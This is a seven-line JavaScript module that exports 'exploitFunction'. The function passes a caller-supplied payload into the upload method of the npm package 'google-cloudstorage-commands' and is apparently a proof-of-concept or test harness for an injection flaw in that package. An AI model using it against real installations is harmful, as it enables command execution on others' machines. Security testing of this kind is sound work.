function exploitFunction(payload) {
  const root = require("google-cloudstorage-commands");
  return root.upload("./", payload, true);
}

module.exports = { exploitFunction };